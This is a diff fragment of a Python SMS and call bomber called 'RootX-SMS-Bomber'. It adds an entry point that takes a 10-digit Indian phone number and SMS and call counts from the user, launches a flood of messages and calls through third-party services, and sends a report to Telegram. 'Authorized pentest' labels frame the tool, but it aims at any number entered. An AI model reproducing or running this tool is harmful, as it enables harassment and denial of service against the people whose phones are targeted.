+            f"<i>Authorized Pentest • Educational Purpose</i>"
+        )
+        tg_send(report_msg)
+        print("[*] Report sent to Telegram ✅")
+
+
+# ──── ENTRY POINT ────
+def main():
+    """Main entry point"""
+    import os
+    
+    # Clear terminal
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+    # Header
+    print("╔══════════════════════════════════════════╗")
+    print("║       🔥 RootX-SMS-Bomber v1.0 🔥        ║")
+    print("║    Multi-Platform SMS/Call Attack        ║")
+    print("║    callbomberz.in + khojotech.in         ║")
+    print("║    [✓] Telegram Report Enabled           ║")
+    print("╚══════════════════════════════════════════╝")
+    print()
+    
+    # Get phone number
+    phone = input("[?] Enter 10-digit phone number (without +91): ").strip()
+    
+    # Validate
+    if not phone.isdigit() or len(phone) != 10:
+        print("[!] Invalid number! Must be 10 digits.")
+        sys.exit(1)
+    
+    # Get SMS count
+    try:
+        sms_count = int(input("[?] SMS count per provider (default 50): ").strip() or "50")
+    except:
+        sms_count = 50
+    
+    # Get Call count
+    try:
+        call_count = int(input("[?] Call count per provider (default 10): ").strip() or "10")
+    except:
+        call_count = 10
+    
+    print(f"\n[!] Authorized Pentest Mode")
+    print(f"[!] Targeting: +91{phone}")
+    print(f"[!] SMS: {sms_count} | Calls: {call_count}")
+    print()
+    
+    confirm = input("[?] Start attack? (y/N): ").strip().lower()
+    if confirm != 'y':
+        print("[*] Aborted.")
+        sys.exit(0)
+    
+    # Run bomber
+    bomber = RootXBomber(phone, sms_count, call_count)
+    bomber.run()
 
 
 if __name__ == "__main__":
-    try:
-        RootXBomber().show_menu()
-    except KeyboardInterrupt:
-        print(f"\n{C.RED}Exiting...{C.RST}")
-        sys.exit(0)
+    main()
